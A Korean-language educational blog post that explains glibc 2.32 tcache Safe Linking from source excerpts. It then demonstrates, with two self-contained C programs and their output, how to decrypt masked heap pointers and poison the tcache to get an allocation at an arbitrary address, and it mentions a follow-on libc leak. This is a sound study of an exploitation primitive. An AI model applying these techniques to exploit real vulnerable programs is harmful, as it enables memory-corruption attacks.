---
title: "Per-thread Cache (Tcache) Safe Linking"
tags: background
toc: true
---

## Introduction

Glibc의 per-thread cache (tcache)는 malloc 함수의 성능 향상을 위해
도입되었고, 2.32 버전부터 단일 연결 리스트의 포인터 암호화 (Safe 
Linking)가 추가되었다[1, 2].

<br>

본 글에서는 glibc 2.32 버전을 기준으로 tcache safe linking과 이
상황에서의 tcache poisoning을 알아볼 것이다.


## Background

Tcache 구조체에는 크기 구간 별로 엔트리 (entry)가 있으며, 이들은
해제된 메모리 리스트 (freelist)의 헤드 (head) 노드에 대한
포인터이다. 그리고 각 엔트리 리스트의 노드 개수를 관리하는 배열이 있다.

    tcache_perthread_struct:
      counts:  +----------------+  ---
               |                |   ^
               |    ...         |   |
               |                |  TCACHE_MAX_BINS * 2 (=64 * 2)
               |                |   |
               |                |   V
      entries: +----------------+  ---                       ---
               |  entries[0]    |                             ^
               +----------------+                             |
               |  entries[1]    |               TCACHE_MAX_BINS * 8 (=64 * 8)
               +----------------+                             |
               |  entires[2]    |->[  next  ]->NULL           |
               +----------------+  [  key   ]                 |
               |    ...         |                             V
               +----------------+                            ---

tcache\_get 함수 (malloc)는 엔트리 리스트에서 노드를 가져오고,
tcache\_put 함수 (free)는 엔트리 리스트의 헤드 부분에 노드를
넣는다. 이때 next 멤버를 변경하는데 여기에 safe linking이 동작한다.


### Per-thread cache allocation

그럼 상기 설명한 것을 소스코드상에서 살펴보자. Glibc는 tcache 구조체를
다음과 같이 정의한다 (malloc/malloc.h에서 발췌)[3].

    /* We overlay this structure on the user-data portion of a chunk when
       the chunk is stored in the per-thread cache.  */
    typedef struct tcache_entry
    {
      struct tcache_entry *next;
      /* This field exists to detect double frees.  */
      struct tcache_perthread_struct *key;
    } tcache_entry;
    
    /* There is one of these for each thread, which contains the
       per-thread cache (hence "tcache_perthread_struct").  Keeping
       overall size low is mildly important.  Note that COUNTS and ENTRIES
       are redundant (we could have just counted the linked list each
       time), this is for performance reasons.  */
    typedef struct tcache_perthread_struct
    {
      uint16_t counts[TCACHE_MAX_BINS]; /* TCACHE_MAX_BINS == 64 */
      tcache_entry *entries[TCACHE_MAX_BINS];
    } tcache_perthread_struct;

이때 tcache\_get 함수는 엔트리 리스트에 노드가 있어야 호출한다. 즉,
해제된 메모리가 있어야 한다는 것이다. 그래서 초기 상태 (tcache ==
NULL)나 해제된 메모리 없이 메모리를 할당 하고 있는 상황이라면,
\_int\_malloc 함수로 할당한다. 이를 정리하면 다음과 같다.

    malloc()                        /* bytes: allocation size */
    __libc_malloc()--+
                     |
                     +------------------------+------------+
                     |                        |            |tcache == NULL
                     |1                       |2           |3
                     V                        V            V
                  checked_request2size()  csize2tidx()   tcache_init()
                     |                                  
                     |
                     |size < PTRDIFF_MAX (=9223372036854775807L)
                     |
                     V
                  request2size()
    _int_malloc()

위 콜 트레이스에서 request2size 매크로는 사용자가 요구한 크기값을 청크 
크기로 변환하고, csize2tidx 매크로는 청크 크기로부터 entries 멤버 배열의
인덱스를 계산한다. 다만, csizes2tidx 매크로가 계산한 값은
tcahce\_get()에서 사용한다. 그 코드는 다음과 같다 (malloc/malloc.c에서
발췌)[3].

    /* SIZE_SZ == sizeof(size_t) (=8)
       MALLOC_ALIGN_MASK == MALLOC_ALIGNMENT - 1 (=2 * SIZE_SZ - 1)
       MIN_CHUNK_SIZE == (offsetof(struct malloc_chunk, fd_nextsize)) (=32)
       MINSIZE == (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)) (=32)
       */
    
    #define request2size(req)                                         \
      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
       MINSIZE :                                                      \
       ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

    /* MALLOC_ALIGNMENT == 2 * SIZE_SZ (=2 * 8)
       MINSIZE == (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)) (=32)
     */
    
    # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)

그런데 아직 tcache가 구성되지 않았다면 (tcache == NULL),
tcache\_init()을 호출하여 이를 위한 메모리를 할당한다.

<br>

만약 사용자가 요구한 크기가 속하는 구간의 엔트리 리스트에 기 해제된
메모리가 있다면, malloc()은 tcache\_get()으로 할당 작업을 수행할
것이다. 이 경우에는 상기 콜 트레이스가 다음과 같이 된다.

    malloc()                        /* bytes: allocation size */
    __libc_malloc()--+
                     |
                     +------------------------+------------+
                     |                        |            |
                     |1                       |2           |3
                     V                        V            V
                  checked_request2size()  csize2tidx()   tcache_get()
                     |                                  
                     |
                     |size < PTRDIFF_MAX (=9223372036854775807L)
                     |
                     V
                  request2size()

위 콜 트레이스에서 tcache\_get()은 엔트리 리스트의 헤드 노드를 그 다음
노드로 교체하고 본래 헤드 노드를 메모리로 리턴한다. 그 코드는 다음과
같다 (malloc/malloc.c에서 발췌)[3].

    /* Caller must ensure that we know tc_idx is valid and there's
       available chunks to remove.  */
    static __always_inline void *
    tcache_get (size_t tc_idx)
    {
      tcache_entry *e = tcache->entries[tc_idx];
      if (__glibc_unlikely (!aligned_OK (e)))
        malloc_printerr ("malloc(): unaligned tcache chunk detected");
      tcache->entries[tc_idx] = REVEAL_PTR (e->next);
      --(tcache->counts[tc_idx]);
      e->key = NULL;
      return (void *) e;
    }

이때 next 멤버 포인터의 값을 REVEAL\_PTR 매크로로 변환하여 사용하는데,
그 이유는 메모리를 엔트리 리스트에 넣을 때 암호화해놓기
때문이다. 이 매크로는 다음과 같이 정의되고, 이렇게 next 멤버 포인터를
암호화하는 것을 Safe Linking이라고 부른다 (malloc/malloc.c에서 발췌)[3].

    /* Safe-Linking:
       Use randomness from ASLR (mmap_base) to protect single-linked lists
       of Fast-Bins and TCache.  That is, mask the "next" pointers of the
       lists' chunks, and also perform allocation alignment checks on them.
       This mechanism reduces the risk of pointer hijacking, as was done with
       Safe-Unlinking in the double-linked lists of Small-Bins.
       It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
       larger pages provide less entropy, although the pointer mangling
       still works.  */
    #define PROTECT_PTR(pos, ptr) \
      ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
    #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)


### Per-thread cache deallocation

메모리를 해제할 때는 엔트리 리스트가 가득 차지 않았고, 특정 크기
구간에 속하며, mmap()으로 할당된 메모리가 아니라면, tcache\_put 함수가
해제 작업을 수행한다. 이에 대한 콜 트레이스는 다음과 같다.

    free()
    __libc_free()
    _int_free()--+
                 |
                 +------------+
                 |            |tcache != NULL
                 |            |tc_idx < mp_.tcache_bins
                 |            |e->key != tcache
                 |            |tcache->counts[tc_idx] < mp_.tcache_count
                 |1           |2
                 V            V
      tc_idx = csize2tidx()  tcache_puts()

위 그림에서 mp\_의 멤버들은 각각 entries 배열의 최대 인덱스 (=64)와
엔트리 리스트 노드 개수의 최대값을 갖는다. 그 코드는 다음과 같다
(malloc/malloc.c에서 발췌)[3].

    struct malloc_par
    {
        /* ... */
    #if USE_TCACHE
      /* Maximum number of buckets to use.  */
      size_t tcache_bins;
      size_t tcache_max_bytes;
      /* Maximum number of chunks in each bucket.  */
      size_t tcache_count;
      /* Maximum number of chunks to remove from the unsorted list, which
         aren't used to prefill the cache.  */
      size_t tcache_unsorted_limit;
    #endif
    };

그리고 tcache\_put()은 엔트리 리스트의 헤드 노드를 교체하는 방식으로
메모리를 해제한다. 그 코드는 다음과 같다 (malloc/malloc.c에서
발췌)[3]. 

    /* Caller must ensure that we know tc_idx is valid and there's room
       for more chunks.  */
    static __always_inline void
    tcache_put (mchunkptr chunk, size_t tc_idx)
    {
      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    
      /* Mark this chunk as "in the tcache" so the test in _int_free will
         detect a double free.  */
      e->key = tcache;
    
      e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
      tcache->entries[tc_idx] = e;
      ++(tcache->counts[tc_idx]);
    }

위 코드에서 next 멤버 포인터를 PROTECT\_PTR 매크로로 암호화하는 것을 볼
수 있다. 상기에 본 이 매크로의 구현을 생각해보면 힙 주소의 상위 52
비트와 힙 주소를 XOR 하는 방식으로 암호화가 수행됨을 알 수 있다.


## Tcache Poisoning Under Safe Linking

Safe linking은 힙 주소만 사용하여 암호화를 진행하므로 이에 대한 특정
가정 하에서 복호화를 할 수 있다.


### Address decryption

Tcache상에서 두 메모리를 할당받고 해제한 후에 그 값을 읽을 수 있을 때
힙 주소를 얻을 수 있다. 이때 해제된 두 메모리가 갖고 있는 값으로 얻을 
수도 있고, 두 번째로 해제된 메모리가 갖고 있는 값만으로 얻을 수도
있다. 물론, 여기에는 할당된 두 메모리의 주소가 하위 12 비트만 다르다는
가정이 있어야 한다[4].

<br>

예를 들어, e1과 e2를 순서대로 할당한 후에 다시 같은 순서로 해제했다고
하자. 그럼 두 메모리 구성은 다음과 같을 것이다.

    e1 --> +----------------+
           | next    | key  |
           +----------------+
           | ...            |
    e2 --> +----------------+
           | next    | key  |
           +----------------+
           | ...            |
           +----------------+
    
    @ After e1 is freed, e2 is freed

그럼 아래와 같이 e1을 얻을 수 있다.

    e2->next = (e2 >> 12) ^ e1
    e1->next = e1 >> 12 = e2 >> 12
    e1 = e2->next ^ (e2 >> 12) = e2->next ^ e1->next

<br>

앞의 e1과 e2를 각각 12 비트씩 나누어서 e1[0, 1, 2, 3], e2[0, 1, 2,
3], e2->next[0, 1, 2, 3]으로 볼 수 있다. 그럼 아래와 같이 e1[0, 1, 2,
3]을 얻을 수 있다[4].

    e2->next = (e2 >> 12) ^ e1 = (e1 >> 12) ^ e1
    e2->next[0] = e1[0]
    e2->next[1] = e1[0] ^ e1[1]
    e1[1] = e2->next[1] ^ e1[0] = e2->next[1] ^ e2->next[0]
    e2->next[2] = e1[1] ^ e1[2]
    e1[2] = e2->next[2] ^ e1[1] = e2->next[2] ^ e2->next[1] ^ e2->next[0]
    e2->next[3] = e1[2] ^ e1[3]
    e1[3] = e2->next[3] ^ e1[2] = e2->next[3] ^ e2->next[2] ^ e2->next[1] ^ e2->next[0]

이에 대한 예시 코드는 다음과 같다.

    /* filename: safe_linking.c */
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    
    uint64_t decrypt_safe_linked_addr(uint64_t encrypted)
    {
        unsigned int addr[4] = { 0, }, tmpaddr[4] = { 0, };
        uint64_t decrypted;
    
        addr[0] = (encrypted >> 36) & 0xfff;
        addr[1] = (encrypted >> 24) & 0xfff;
        addr[2] = (encrypted >> 12) & 0xfff;
        addr[3] = encrypted & 0xfff;
        tmpaddr[0] = addr[0];
        tmpaddr[1] = addr[0] ^ addr[1];
        tmpaddr[2] = addr[0] ^ addr[1] ^ addr[2];
        tmpaddr[3] = addr[0] ^ addr[1] ^ addr[2] ^ addr[3];
        decrypted = ((uint64_t) tmpaddr[0] << 36)
            | ((uint64_t) tmpaddr[1] << 24)
            | ((uint64_t) tmpaddr[2] << 12)
            | (uint64_t) tmpaddr[3];
        return decrypted;
    }
    
    int main()
    {
        uint8_t *e1, *e2;
        uint64_t heapaddr;
    
        e1 = malloc(0x260);
        if (e1 == NULL) {
            perror("malloc");
            return -1;
        }
    
        e2 = malloc(0x260);
        if (e2 == NULL) {
            perror("malloc");
            return -1;
        }
    
        free(e1);
        free(e2);
    
        heapaddr = decrypt_safe_linked_addr(*((uint64_t *) e2));
        printf("e1: %p\n", e1);
        printf("heap address: %lx\n", heapaddr);
        return 0;
    }

위 코드를 컴파일하여 실행하면 다음과 같이 e1의 주소가 구해짐을 알 수
있다.

    $ gcc safe_linking.c 
    $ ./a.out 
    e1: 0x59ddbc73a2a0
    heap address: 59ddbc73a2a0
    $


### Tcache poisoning

Tcache는 할당할 때 그 다음에 할당할 주소를 복호화하여 entries 멤버
배열에 저장한다. 따라서 힙 주소가 leak되었거나 힙 주소의 하위 12
비트를 제외한 부분이라도 leak되었고, 해제된 tcache 메모리에 데이터를
쓸 수 있다면, next 멤버 포인터를 조작하여 그 다음에 할당될 주소를
바꿔버릴 수 있다.

<br>

예를 들어, 두 메모리가 다음과 같이 위에서부터 순서대로 할당되었다고 하자.

    e1 -> [ 0x2a0 ]
    e2 -> [ 0x510 ]
    
    @ e1 and e2 are real heap address

그리고 다시 위에서부터 순서대로 해제하면 아래와 같이 리스트가
구성될 것이다.

    [ 0x510 ] -> [ 0x2a0 ] -> NULL

이때 0x510의 next에 (e2 >> 12) ^ (arbitrary memory address)를 쓰면
0x2a0가 할당되었어야 할 시점에 조작된 임의의 메모리 주소가 할당될
것이다. 이에 대한 예시 코드는 다음과 같다.

    /* filename: safe_linking.c */
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    
    uint64_t decrypt_safe_linked_addr(uint64_t encrypted)
    {
        unsigned int addr[4] = { 0, }, tmpaddr[4] = { 0, };
        uint64_t decrypted;
    
        addr[0] = (encrypted >> 36) & 0xfff;
        addr[1] = (encrypted >> 24) & 0xfff;
        addr[2] = (encrypted >> 12) & 0xfff;
        addr[3] = encrypted & 0xfff;
        tmpaddr[0] = addr[0];
        tmpaddr[1] = addr[0] ^ addr[1];
        tmpaddr[2] = addr[0] ^ addr[1] ^ addr[2];
        tmpaddr[3] = addr[0] ^ addr[1] ^ addr[2] ^ addr[3];
        decrypted = ((uint64_t) tmpaddr[0] << 36)
            | ((uint64_t) tmpaddr[1] << 24)
            | ((uint64_t) tmpaddr[2] << 12)
            | (uint64_t) tmpaddr[3];
        return decrypted;
    }
    
    uint64_t encrypt_safe_linking(uint64_t heapbase, uint64_t target)
    {
        return heapbase ^ target;
    }
    
    int main()
    {
        uint8_t *e1, *e2;
        uint64_t heapaddr;
    
        e1 = malloc(0x260);
        if (e1 == NULL) {
            perror("malloc");
            return -1;
        }
    
        e2 = malloc(0x260);
        if (e2 == NULL) {
            perror("malloc");
            return -1;
        }
    
        free(e1);
        free(e2);
    
        heapaddr = decrypt_safe_linked_addr(*((uint64_t *) e2));
        printf("e1: %p\n", e1);
        printf("heap address: %lx\n", heapaddr);
    
        *((uint64_t *) e2) = encrypt_safe_linking((uint64_t) e2 >> 12,
                                                  heapaddr - 0x10);
        e1 = malloc(0x260);
        if (e1 == NULL) {
            perror("malloc");
            return -1;
        }
    
        e2 = malloc(0x260);
        if (e2 == NULL) {
            perror("malloc");
            return -1;
        }
    
        printf("e2: %p\n", e2);
        return 0;
    }

위 코드를 실행하면 다음과 같이 e1 - 0x10이 e2로 할당되었음을 알 수
있다.

    $ gcc safe_linking.c 
    $ ./a.out 
    e1: 0x6229c9cf12a0
    heap address: 6229c9cf12a0
    e2: 0x6229c9cf1290

위 코드에서는 청크의 크기를 포함하는 주소로 할당했지만, 이 크기값을 조작하여 unsorted bin 공격을 한다면,
libc leak을 할 수 있다.

## References

1.  DJ Delorie, "malloc per-thread cache: benchmarks." sourceware.org,
    Accessed: Feb. 23, 2026. [Online]. Available:
    <https://sourceware.org/legacy-ml/libc-alpha/2017-01/msg00452.html>
2.  Eyal Itkin, "[PATCH] Add Safe-Linking to fastbins and tcache."
    sourceware.org, Accessed: Feb. 23, 2026. [Online]. Available:
    <https://sourceware.org/pipermail/libc-alpha/2020-March/111631.html>
3.  Ulrich Drepper et al., 2020, "GNU C Library," (Version 2.32),
    [Source Code]. <https://ftp.gnu.org/gnu/glibc/glibc-2.32.tar.gz>
4.  민사민서, "tcache safe linking," minseosavestheworld.tistory.com,
    Accessed: Feb. 24, 2026. [Online]. Available:
    <https://minseosavestheworld.tistory.com/179>

